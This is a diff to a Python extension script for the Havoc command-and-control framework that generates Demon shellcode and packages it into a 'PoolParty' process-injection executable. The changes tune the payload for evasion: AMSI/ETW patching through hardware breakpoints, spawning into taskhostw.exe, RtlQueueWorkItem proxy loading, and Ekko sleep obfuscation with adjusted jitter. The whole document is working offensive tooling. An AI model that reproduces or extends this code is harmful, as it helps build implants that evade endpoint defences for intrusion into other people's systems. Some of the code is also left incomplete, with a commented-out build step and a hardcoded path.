@@ -2,10 +2,12 @@
 #Author : Cipher007
 
 from havoc import Demon, RegisterCommand, RegisterModule
+import havoc
 import os
 
 
-cwd = os.getcwd()
+#cwd = os.getcwd()
+cwd = "/home/cipher/Github/havoc-PoolParty"
 shellcode_file_path = cwd + "/payload.bin"
 
 def generate_payload(demon, arch, listener):
@@ -16,26 +18,26 @@ def generate_payload(demon, arch, listener):
             arch,
             "Windows Shellcode",
             "{ \
-                \"Amsi/Etw Patch\": \"None\", \
+                \"Amsi/Etw Patch\": \"Hardware breakpoints\", \
                 \"Indirect Syscall\": true,  \
                 \"Injection\": { \
                     \"Alloc\": \"Native/Syscall\", \
                     \"Execute\": \"Native/Syscall\", \
-                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\", \
-                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \
+                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\taskhostw.exe\", \
+                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\" \
                 }, \
-                \"Jitter\": \"15\", \
-                \"Proxy Loading\": \"None (LdrLoadDll)\", \
-                \"Sleep\": \"2\", \
+                \"Jitter\": \"17\", \
+                \"Proxy Loading\": \"RtlQueueWorkItem\", \
+                \"Sleep\": \"15\", \
                 \"Sleep Technique\": \"Ekko\", \
                 \"Stack Duplication\": true \
             }"
         )
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
-	os.system("python3 generate.py -f {shellcode_file_path} ")
+	#os.system(f"python3 generate.py -f {shellcode_file_path} ")
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
-	return None
+	return False
 
 def generate(demonID, *params):
 	TaskID : str = None
@@ -44,46 +46,40 @@ def generate(demonID, *params):
 
 	arch = ""
 	listener = ""
+
 	num_params = len(params)
-	skip = False
-	for i in range(num_params):
-		if skip:
-			skip = False
-			continue
+	listeners = havoc.GetListeners()
 
-		param = param[i]
+	if num_params != 4 or params[0] == 'help' or params[0] == '-h':
+		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
+		demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a {x86/x64} -l {listener name}")
+		demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
+		if len(listeners) == 0:
+			demon.ConsoleWrite(demon.CONSOLE_ERROR, "No Listeners Running!!!")
+		else:
+			for listen in listeners:
+				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
+		return False
+	
+	elif params[1] != 'x86' and params[1] != 'x64':
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please select either x86 or x64 as your shellcode")
+		return False
 
-		if param == '-a' or param == '--arch':
-			skip = True
-			if i+1 > num_params:
-				demon.ConsoleWrite(demon.CONSOLE_ERROR, 'missing architecture value (x86/x64)')
-				return None
-			arch = param[i+1]
-
-		elif param == '-l' or param == '--listener':
-			skip = True
-			if i+1 > num_params:
-				demon.ConsoleWrite(demon.CONSOLE_ERROR, 'missing listener name')
-				demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
-				listeners = havoc.GetListeners()
-				for listen in listeners:
-					demon.ConsoleWrite(demon.CONSOLE_INFO, f'   {listen}')
-			listener = param[i+1]
-
-		elif param == 'help' or param == '-h':
-			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid Argument: {param}")
-			demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
-			demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a <x86/x64> -l <listener name>")
-			return None
+	else:
+		arch = params[1]
+		listener = params[3]
+		if listener not in listeners:
+			demon.ConsoleWrite(demon.CONSOLE_ERROR, "Listener is Invalid!")
+			demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
+			for listen in listeners:
+				demon.ConsoleWrite(demon.CONSOLE_INFO, f'-   {listen}')
+			return False
 
 		else:
-			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid Argument: {param}")
-			demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
-			demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a <x86/x64> -l <listener name>")
-			return None
-
-	demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
-	generate_payload(demon, arch, listener)
+			demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
+	
+			TaskID = generate_payload(demon, arch, listener)
+			return TaskID
 
 def save_shellcode(data):
 	with open(shellcode_file_path, "wb") as file:
